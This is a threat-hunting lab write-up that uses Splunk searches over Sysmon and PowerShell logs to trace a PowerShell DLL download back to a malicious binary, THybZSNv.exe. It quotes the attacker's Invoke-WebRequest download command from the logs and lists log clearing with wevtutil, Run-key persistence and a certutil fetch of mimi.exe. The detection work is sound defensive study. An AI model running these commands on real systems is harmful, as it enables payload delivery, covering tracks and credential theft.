# Hunting PowerShell Execution

## Overview

This report documents hunting for execution artifacts under the Execution tactic on the MITRE ATT&CK framework. The related technique is Command and Scripting Interpreter: PowerShell (T1059.001). I used Splunk to search Sysmon and PowerShell operational logs for evidence of PowerShell being used to carry out an attack, then traced the activity back to its root cause.

## Log Sources Available

- XmlWinEventLog:Application
- XmlWinEventLog:Microsoft-Windows-PowerShell/Operational
- XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
- XmlWinEventLog:Microsoft-Windows-Windows Defender/Operational
- XmlWinEventLog:Security
- XmlWinEventLog:System

## Investigation

### Step 1: Find process creation events

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
```

Queried Sysmon Event ID 1 to look for process creation events.

### Step 2: Narrow down to PowerShell processes

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
```

This surfaced three PowerShell binary paths:

- C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
- C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

![Screenshot placeholder: PowerShell process creation search results](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step2.png)

### Step 3: Cut out noise

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*\powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
| stats count by Image
```

I excluded the Splunk Universal Forwarder's PowerShell helper as expected noise, which left 6 events tied to `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`. A 32-bit PowerShell process running on a 64-bit host can be normal, but it's also worth flagging as suspicious depending on context.
![step3](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step3.png)

### Step 4: Add fidelity to the events

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*\powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
| table _time, user, Image, CommandLine, ParentImage, ParentCommandLine, IntegrityLevel
| sort -_time
```

![Screenshot placeholder: PowerShell events table with command lines and parent processes](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step4.png)

Most of the results traced back to `C:\Windows\System32\CompatTelRunner.exe` as the parent process, running a script that checks driver `.inf` files against a compatibility pattern. I researched this process and confirmed it is Microsoft's Compatibility Telemetry system, executed from its correct path — this activity looks like a legitimate compatibility scan rather than malicious behavior.

The final and most recent entry stood out from the rest:

```
powershell -c "Invoke-WebRequest -Uri hxxp://10[.]0[.]2[.]6/dghelper.dll -OutFile 'C:\Windows\System32\dghelper.dll'"
```

This is a PowerShell command downloading a DLL file from an external host — a strong indicator of tool transfer rather than a routine system process.

### Step 5: Confirm execution via PowerShell operational logs

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
EventID=4103
| stats count by Payload
```

This returned many results tied to the compatibility check noise, so I filtered it out:

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
EventID=4103
| where NOT like(Payload, "%inf%")
| stats count by Payload
```

![Screenshot placeholder: filtered PowerShell operational log payloads](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step%205.png)

This confirmed the `Invoke-WebRequest` call, its `-Uri` parameter pointing to `hxxp://10[.]0[.]2[.]6/dghelper[.]dll`, and its `-OutFile` parameter writing to `C:\Windows\System32\dghelper.dll`.

### Step 6: Confirm scope and network activity

```spl
index="aa15cbf9" dghelper.dll
```
![step6.1](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step6.1.png)

Nine events referenced `dghelper.dll`, giving me a way to check whether other hosts had contact with the same file or infrastructure.

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=3 DestinationIp=10.0.2.6
```

This confirmed the outbound network connection to `10[.]0[.]2[.]6` over port 80.

![step6.2](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step6.2.png)

### Step 7: Pivot on the process ID to reconstruct what happened next
 
The `Invoke-WebRequest` command's parent process was `cmd.exe`, so I pulled its process ID (3916) and searched for every event tied to it.
 
```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 ParentProcessId=3916
| table _time, host, user, Image, CommandLine
| sort -_time
```
 
![Screenshot placeholder: full list of commands run under process ID 3916](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step7.png)
 
This single process ID unlocked the entire attack sequence, spanning reconnaissance, persistence, defense evasion, and credential theft:
 
| Time | Image | Command |
|---|---|---|
| 22:28:37 | whoami.exe | whoami /all |
| 22:28:44 | ipconfig.exe | ipconfig /all |
| 22:29:46 | powershell.exe | Invoke-WebRequest download of dghelper.dll |
| 22:30:38 | reg.exe | reg add Run key persistence for dghelper.dll |
| 22:30:48 | wevtutil.exe | wevtutil cl Security |
| 22:30:54 | wevtutil.exe | wevtutil cl System |
| 22:30:58 | wevtutil.exe | wevtutil cl Application |
| 22:31:19 | certutil.exe | certutil -urlcache -split -f download of mimi.exe |
| 22:31:33 | mimi.exe | executed |
 
### Step 8: Find the parent of the cmd.exe process
 
```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 ProcessId=3916
| table ParentImage, ParentProcessGuid
| sort -_time
```
![step8](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step8.png)
 
This traced `cmd.exe` (process ID 3916) back to a parent process of `C:\Windows\THybZSNv.exe` — an unfamiliar binary sitting directly under `C:\Windows\`, which is not a normal install location for a legitimate application.
 
### Step 9: Investigate THybZSNv.exe and confirm it's malicious
 
```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image="C:\Windows\THybZSNv.exe"
| table _time, host, user, Image, CommandLine, ParentImage, MD5
| sort -_time
```
![Screenshot placeholder: THybZSNv.exe process event with hash](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step9.png)
 
![Screenshot placeholder: THybZSNv.exe process event with hash](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/7894c6a4e70b3f20fbb594854ef42dc5f5315d39/Hunting%20attack%20chains%20and%20execution/media/powershell/step9.2.png)
 
This showed `THybZSNv.exe` spawned from `C:\Windows\System32\services.exe`, with an MD5 hash of `6983F7001DE10F4D19FC2D794C3EB534`. I ran the hash against VirusTotal, which confirmed it as a 32-bit remote execution tool — malware, not a legitimate system binary.
 
## Key Findings
 
- The initial cluster of PowerShell activity from `CompatTelRunner.exe` is legitimate Microsoft compatibility telemetry, not malicious.
- A separate PowerShell command used `Invoke-WebRequest` to download `dghelper.dll` from `hxxp://10[.]0[.]2[.]6`, saving it to `C:\Windows\System32\`.
- The download was confirmed at the network layer, with a Sysmon Event ID 3 connection to `10[.]0[.]2[.]6` over port 80.
- Pivoting on the parent `cmd.exe` process ID (3916) exposed the full attack sequence: reconnaissance (`whoami`, `ipconfig`), persistence (Registry Run key), defense evasion (event log clearing), and a second tool download (`certutil` pulling `mimi.exe`).
- The `cmd.exe` process itself was spawned by `C:\Windows\THybZSNv.exe`, an unfamiliar binary sitting directly under `C:\Windows\`.
- A VirusTotal lookup on `THybZSNv.exe`'s MD5 hash (`6983F7001DE10F4D19FC2D794C3EB534`) confirmed it as a 32-bit remote execution tool — the true root of the attack chain.
## Key Takeaways
 
- Not every PowerShell event is malicious — checking the parent process and the binary's file path helps separate normal system behavior from attacker activity.
- Filtering out known-noisy processes (like compatibility or telemetry scans) makes it much easier to spot the one command that matters.
- Correlating a suspicious command with network connection logs is what turns a suspicious PowerShell line into a confirmed indicator of compromise.
- Pivoting on a process ID rather than a single event is what turns one suspicious command into a full attack timeline.
- Hash lookups against VirusTotal are a fast way to confirm whether an unfamiliar binary is malicious before spending more time investigating it.
## Conclusion
 
I traced a malicious PowerShell-based file download (T1059.001) back through its parent `cmd.exe` process to its true root cause, `THybZSNv.exe`, and confirmed it as malware via a VirusTotal hash lookup.
 
